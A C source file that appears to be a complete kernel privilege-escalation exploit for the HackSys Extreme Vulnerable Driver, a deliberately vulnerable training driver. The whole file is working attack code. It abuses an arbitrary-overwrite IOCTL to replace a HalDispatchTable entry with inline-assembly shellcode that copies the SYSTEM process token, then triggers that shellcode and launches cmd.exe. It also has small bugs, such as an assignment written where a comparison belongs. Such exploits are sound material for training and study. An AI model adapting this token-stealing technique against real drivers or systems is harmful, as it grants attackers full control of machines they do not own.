#include <Windows.h>
#include <stdio.h>

#define HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)

#define KTHREAD_OFFSET     0x124  
#define EPROCESS_OFFSET    0x050  
#define PID_OFFSET         0x0B4  
#define FLINK_OFFSET       0x0B8  
#define TOKEN_OFFSET       0x0F8  
#define SYSTEM_PID         0x004  

VOID payloadWIN7() {
	__asm {
		pushad


		xor eax, eax
		mov eax, fs:[eax + KTHREAD_OFFSET]


		mov eax, [eax + EPROCESS_OFFSET]

		mov ecx, eax

		mov edx, SYSTEM_PID

		SearchSystemPID :
		mov eax, [eax + FLINK_OFFSET]
			sub eax, FLINK_OFFSET
			cmp[eax + PID_OFFSET], edx
			jne SearchSystemPID

			mov edx, [eax + TOKEN_OFFSET]
			mov[ecx + TOKEN_OFFSET], edx


			popad
	}
}

typedef struct SYSTEM_MODULE {
	ULONG                Reserved1;
	ULONG                Reserved2;
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 w018;
	WORD                 NameOffset;
	BYTE                 Name[255];
}SYSTEM_MODULE, *PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation = 11,
	SystemHandleInformation = 16
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI *PNtQuerySystemInformation)(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT PVOID                   SystemInformation,
	IN ULONG                    SystemInformationLength,
	OUT PULONG                  ReturnLength
	);

typedef NTSTATUS(WINAPI *NtQueryIntervalProfile_t)(
	IN ULONG ProfileSource,
	OUT PULONG Interval
	);

int wmain(int argc, WCHAR *argv[])
{

	HANDLE hHeap;
	HANDLE hDevice;
	LPCWSTR lpFileName = L"\\\\.\\HackSysExtremeVulnerableDriver";
	LPCWSTR lpModuleName = L"ntdll";
	LPCSTR lpProcName = "NtQuerySystemInformation";
	BOOL bDeviceControl;
	BOOL bFree;
	BOOL bNewProcess;
	DWORD junk = 0;
	DWORD BytesReturned = 0;
	NTSTATUS status;
	ULONG length = 0;
	ULONG interval = 0;
	PVOID kImageBaseAddr;
	PVOID pKernelHAL;
	PVOID pHALOverwrite;
	PVOID pUserHAL;
	PVOID pPayload = &payloadWIN7;
	PVOID pPointerTopPayload = &pPayload;
	PCHAR kImageName;
	HMODULE ntdll;
	HMODULE userBase;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	char *lpBuffer;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);

	ZeroMemory(&pi, sizeof(pi));

	ntdll = GetModuleHandle(lpModuleName);

	PNtQuerySystemInformation NtQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(ntdll, lpProcName);

	if (NtQuerySystemInformation == NULL) {

		wprintf(L"[-]Error getting NtQuerySystemInformation address...\r\n");

	}

	else {

		wprintf(L"[+]NtQueryInformation address returned successfully...\r\n");
	}

	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &length);

	PSYSTEM_MODULE_INFORMATION ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (ModuleInfo == NULL) {

		wprintf(L"[-]Error allocating virtual memory for Module Information...\r\n");

	}

	else {

		wprintf(L"[+]Virtual memory for Module Information allocated successfully...\r\n");

	}

	NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, length, &length);

	kImageBaseAddr = (PVOID)ModuleInfo->Modules[0].ImageBaseAddress;
	kImageName = (PCHAR)ModuleInfo->Modules[0].Name;
	kImageName = (PCHAR)strrchr(kImageName, '\\') + 1;

	userBase = LoadLibraryA(kImageName);

	if (userBase == NULL) {

		printf("[-]Error loading %s library...\r\n", kImageName);

	}

	else {

		printf("[+]Library %s loaded successfully...\r\n", kImageName);

	}

	pUserHAL = (PVOID)GetProcAddress(userBase, "HalDispatchTable");

	if (pUserHAL == NULL) {

		wprintf(L"[-]Error loading HalDispatchTable address...\r\n");

	}

	else {

		wprintf(L"[+]HalDispatchTable address loaded successfully...\r\n");

	}

	printf("[*]Kernel Image Name: %s\r\n", kImageName);
	printf("[*]Kernel Image Base Address: 0x%x\r\n", kImageBaseAddr);
	printf("[*]User Image Base Address: 0x%x\r\n", userBase);
	printf("[*]User HalDispatchTable Address: 0x%x\r\n", pUserHAL);

	pKernelHAL = (PVOID)(((ULONG)pUserHAL - (ULONG)userBase) + (ULONG)kImageBaseAddr);
	pHALOverwrite = (PVOID)((ULONG)pKernelHAL + 0x4);

	printf("[*]Kernel HalDispatchTable Address: 0x%x\r\n", pKernelHAL);

	wprintf(L"[*]Allocating virtual memory for shellcode...\r\n");

	hHeap = GetProcessHeap();

	if (hHeap == INVALID_HANDLE_VALUE) {

		wprintf(L"[-]Error getting process heap...\r\n");

	}

	else {

		wprintf(L"[+]Heap processed successfully...\r\n");
	}

	lpBuffer = (char *)HeapAlloc(
		hHeap,
		HEAP_ZERO_MEMORY,
		0x8
	);

	if (lpBuffer == NULL) {

		wprintf(L"[-]Error allocatinh heap...\r\n");

	}

	else {

		wprintf(L"[+]Heap allocated successfully...\r\n");

	}

	ZeroMemory(lpBuffer, sizeof(lpBuffer));
	RtlCopyMemory((char *)lpBuffer, &pPointerTopPayload, 0x4);
	RtlCopyMemory((char *)(lpBuffer + 0x4), (PVOID)&pHALOverwrite, 0x4);

	hDevice = CreateFile(
		lpFileName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (hDevice == INVALID_HANDLE_VALUE) {

		wprintf(L"[-]Error creating device file...\r\n");

	}

	else {

		wprintf(L"[+]File device created successfully...\r\n");

	}

	bDeviceControl = DeviceIoControl(
		hDevice,
		HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE,
		(PVOID)lpBuffer, 0x8,
		NULL,
		0,
		&BytesReturned,
		NULL
	);

	if (bDeviceControl == FALSE) {

		wprintf(L"[-]Error sending buffer to driver...\r\n");

	}

	else {

		wprintf(L"[+]Buffer sended to driver successfully...\r\n");

	}

	NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(ntdll, "NtQueryIntervalProfile");

	if (NtQueryIntervalProfile == NULL) {

		wprintf(L"[-]Failed to load NtQueryIntervalProfile address from ntdll...\r\n");

	}

	else {

		wprintf(L"[+]NtQueryIntervalProfile address loaded successfully...\r\n");

	}

	NtQueryIntervalProfile(0xabcd, &interval);

	bNewProcess = CreateProcess(
		L"C:\\Windows\\System32\\cmd.exe",
		NULL,
		NULL,
		NULL,
		0,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&si,
		&pi
	);

	if (bNewProcess == 0) {

		wprintf(L"[-]Failed creating new process...\r\n");

	}

	else {

		wprintf(L"[+]New process created successfully...\r\n");

	}

	bFree = HeapFree(
		hHeap,
		0,
		lpBuffer
	);

	if (bFree = FALSE) {

		wprintf(L"[-]Error freezing heap...\r\n");

	}

	else {

		wprintf(L"[+]Heap freezed successfully...\r\n");

	}

	CloseHandle(hDevice);

	system("PAUSE");

	return 0;
}